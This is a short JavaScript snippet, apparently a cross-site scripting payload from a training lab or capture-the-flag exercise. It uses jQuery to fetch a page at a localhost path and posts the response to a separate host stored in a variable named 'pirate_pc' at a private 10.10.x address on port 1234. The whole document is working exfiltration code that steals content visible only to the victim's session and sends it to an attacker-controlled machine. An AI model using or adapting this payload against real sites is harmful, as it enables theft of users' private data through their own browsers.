var url='http://localhost:8000/vac/8dd841ff-3f44-4f2b-9324-9a833e2c6b65'
var pirate_pc='http://10.10.15.92:1234'

$.ajax({
    method: 'GET',
    url: url,
    success: function(data){
        $.post(pirate_pc,data);
    }
});